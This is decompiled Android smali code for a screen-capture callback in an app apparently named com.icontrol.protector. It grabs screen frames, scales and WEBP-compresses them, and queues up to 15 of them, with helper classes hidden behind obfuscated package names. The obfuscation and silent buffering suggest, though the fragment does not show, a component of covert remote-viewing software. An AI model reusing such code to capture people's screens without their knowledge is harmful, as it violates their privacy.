.class Lcom/icontrol/protector/ScreenCaps$e;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Landroid/media/ImageReader$OnImageAvailableListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/icontrol/protector/ScreenCaps;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "e"
.end annotation


# instance fields
.field final synthetic a:Lcom/icontrol/protector/ScreenCaps;


# direct methods
.method private constructor <init>(Lcom/icontrol/protector/ScreenCaps;)V
    .locals 0

    .line 1
    iput-object p1, p0, Lcom/icontrol/protector/ScreenCaps$e;->a:Lcom/icontrol/protector/ScreenCaps;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method synthetic constructor <init>(Lcom/icontrol/protector/ScreenCaps;Lcom/icontrol/protector/ScreenCaps$a;)V
    .locals 0

    .line 2
    invoke-direct {p0, p1}, Lcom/icontrol/protector/ScreenCaps$e;-><init>(Lcom/icontrol/protector/ScreenCaps;)V

    return-void
.end method


# virtual methods
.method public onImageAvailable(Landroid/media/ImageReader;)V
    .locals 6

    new-instance p1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {p1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    const/4 v0, 0x0

    :try_start_0
    iget-object v1, p0, Lcom/icontrol/protector/ScreenCaps$e;->a:Lcom/icontrol/protector/ScreenCaps;

    invoke-static {v1}, Lcom/icontrol/protector/ScreenCaps;->c(Lcom/icontrol/protector/ScreenCaps;)Landroid/media/ImageReader;

    move-result-object v1

    invoke-virtual {v1}, Landroid/media/ImageReader;->acquireLatestImage()Landroid/media/Image;

    move-result-object v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_3

    if-eqz v1, :cond_2

    :try_start_1
    invoke-virtual {v1}, Landroid/media/Image;->getPlanes()[Landroid/media/Image$Plane;

    move-result-object v2

    const/4 v3, 0x0

    aget-object v4, v2, v3

    invoke-virtual {v4}, Landroid/media/Image$Plane;->getBuffer()Ljava/nio/ByteBuffer;

    move-result-object v4

    aget-object v5, v2, v3

    invoke-virtual {v5}, Landroid/media/Image$Plane;->getPixelStride()I

    move-result v5

    aget-object v2, v2, v3

    invoke-virtual {v2}, Landroid/media/Image$Plane;->getRowStride()I

    move-result v2

    iget-object v3, p0, Lcom/icontrol/protector/ScreenCaps$e;->a:Lcom/icontrol/protector/ScreenCaps;

    invoke-static {v3}, Lcom/icontrol/protector/ScreenCaps;->d(Lcom/icontrol/protector/ScreenCaps;)I

    move-result v3

    mul-int/2addr v3, v5

    sub-int/2addr v2, v3

    iget-object v3, p0, Lcom/icontrol/protector/ScreenCaps$e;->a:Lcom/icontrol/protector/ScreenCaps;

    invoke-static {v3}, Lcom/icontrol/protector/ScreenCaps;->d(Lcom/icontrol/protector/ScreenCaps;)I

    move-result v3

    div-int/2addr v2, v5

    add-int/2addr v3, v2

    iget-object v2, p0, Lcom/icontrol/protector/ScreenCaps$e;->a:Lcom/icontrol/protector/ScreenCaps;

    invoke-static {v2}, Lcom/icontrol/protector/ScreenCaps;->i(Lcom/icontrol/protector/ScreenCaps;)I

    move-result v2

    sget-object v5, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    invoke-static {v3, v2, v5}, Landroid/graphics/Bitmap;->createBitmap(IILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object v0

    invoke-virtual {v0, v4}, Landroid/graphics/Bitmap;->copyPixelsFromBuffer(Ljava/nio/Buffer;)V

    iget-object v2, p0, Lcom/icontrol/protector/ScreenCaps$e;->a:Lcom/icontrol/protector/ScreenCaps;

    invoke-static {v2}, Lcom/icontrol/protector/ScreenCaps;->i(Lcom/icontrol/protector/ScreenCaps;)I

    move-result v2

    int-to-float v2, v2

    iget-object v3, p0, Lcom/icontrol/protector/ScreenCaps$e;->a:Lcom/icontrol/protector/ScreenCaps;

    invoke-static {v3}, Lcom/icontrol/protector/ScreenCaps;->d(Lcom/icontrol/protector/ScreenCaps;)I

    move-result v3

    int-to-float v3, v3

    div-float/2addr v2, v3

    const/16 v3, 0x15e

    int-to-float v4, v3

    mul-float/2addr v2, v4

    float-to-int v2, v2

    const/4 v4, 0x1

    invoke-static {v0, v3, v2, v4}, Landroid/graphics/Bitmap;->createScaledBitmap(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;

    move-result-object v2

    invoke-static {}, Lcom/icontrol/protector/ScreenCaps;->j()Landroid/content/Context;

    move-result-object v3

    sget-object v4, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->r:Ljava/lang/String;

    sget-object v5, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v3, v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_0

    const/high16 v3, 0x3f800000    # 1.0f

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->o(Landroid/graphics/Bitmap;F)Landroid/graphics/Bitmap;

    move-result-object v2

    sget-object v3, Landroid/graphics/Bitmap$CompressFormat;->WEBP:Landroid/graphics/Bitmap$CompressFormat;

    invoke-static {}, Lcom/icontrol/protector/ScreenCaps;->k()I

    move-result v4

    :goto_0
    invoke-virtual {v2, v3, v4, p1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    goto :goto_1

    :catchall_0
    move-exception v2

    goto :goto_4

    :cond_0
    sget-object v3, Landroid/graphics/Bitmap$CompressFormat;->WEBP:Landroid/graphics/Bitmap$CompressFormat;

    invoke-static {}, Lcom/icontrol/protector/ScreenCaps;->k()I

    move-result v4

    goto :goto_0

    :goto_1
    sget-object v3, Lcom/icontrol/protector/ScreenCaps;->u:Ljava/lang/Object;

    monitor-enter v3
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    sget-object v4, Lcom/icontrol/protector/ScreenCaps;->t:Ljava/util/List;

    invoke-interface {v4}, Ljava/util/List;->size()I

    move-result v4

    const/16 v5, 0xf

    if-ge v4, v5, :cond_1

    sget-object v4, Lcom/icontrol/protector/ScreenCaps;->t:Ljava/util/List;

    invoke-virtual {p1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v5

    invoke-interface {v4, v5}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_2

    :catchall_1
    move-exception v2

    goto :goto_3

    :cond_1
    :goto_2
    monitor-exit v3
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    :try_start_3
    invoke-virtual {v2}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    goto :goto_6

    :goto_3
    :try_start_4
    monitor-exit v3
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    :try_start_5
    throw v2
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    :goto_4
    :try_start_6
    invoke-virtual {v1}, Landroid/media/Image;->close()V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_2

    goto :goto_5

    :catchall_2
    move-exception v1

    :try_start_7
    invoke-virtual {v2, v1}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :goto_5
    throw v2

    :catchall_3
    move-exception v1

    goto :goto_c

    :catch_0
    move-exception v1

    goto :goto_9

    :cond_2
    :goto_6
    if-eqz v1, :cond_3

    invoke-virtual {v1}, Landroid/media/Image;->close()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_0
    .catchall {:try_start_7 .. :try_end_7} :catchall_3

    :cond_3
    :try_start_8
    invoke-virtual {p1}, Ljava/io/ByteArrayOutputStream;->close()V
    :try_end_8
    .catch Ljava/io/IOException; {:try_start_8 .. :try_end_8} :catch_1

    goto :goto_7

    :catch_1
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_7
    if-eqz v0, :cond_4

    :goto_8
    invoke-virtual {v0}, Landroid/graphics/Bitmap;->recycle()V

    goto :goto_b

    :goto_9
    :try_start_9
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_3

    :try_start_a
    invoke-virtual {p1}, Ljava/io/ByteArrayOutputStream;->close()V
    :try_end_a
    .catch Ljava/io/IOException; {:try_start_a .. :try_end_a} :catch_2

    goto :goto_a

    :catch_2
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_a
    if-eqz v0, :cond_4

    goto :goto_8

    :cond_4
    :goto_b
    return-void

    :goto_c
    :try_start_b
    invoke-virtual {p1}, Ljava/io/ByteArrayOutputStream;->close()V
    :try_end_b
    .catch Ljava/io/IOException; {:try_start_b .. :try_end_b} :catch_3

    goto :goto_d

    :catch_3
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_d
    if-eqz v0, :cond_5

    invoke-virtual {v0}, Landroid/graphics/Bitmap;->recycle()V

    :cond_5
    throw v1
.end method
